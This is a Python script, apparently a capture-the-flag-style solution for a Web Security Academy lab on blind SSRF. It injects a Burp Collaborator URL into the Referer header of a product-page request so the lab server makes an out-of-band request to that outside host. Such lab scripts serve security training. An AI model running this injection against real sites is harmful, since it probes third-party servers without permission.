#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 19/10/2023
#
# Lab: Blind SSRF with out-of-band detection
#
# Steps: 1. Inject payload into the Referer header to cause an HTTP request 
#           to the burp collaborator
#        2. Check your burp collaborator for the HTTP request
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a6e00d803e7c1068bb6026c00220004.web-security-academy.net"

# change this to your collaborator domain
collaborator = "zy1qfu1bx8pk2vg4pqwg973vtmzdn5bu.oastify.com"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "Referer header")

# payload to cause an HTTP request to the burp collaborator
payload = f"http://{collaborator}"

# set the Referer header
headers = {
    "Referer": payload
}

try:
    # fetch the page with the injected payload
    requests.get(f"{url}/product?productId=1", headers=headers)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to cause an HTTP request to the burp collaborator.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your burp collaborator for the HTTP request")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


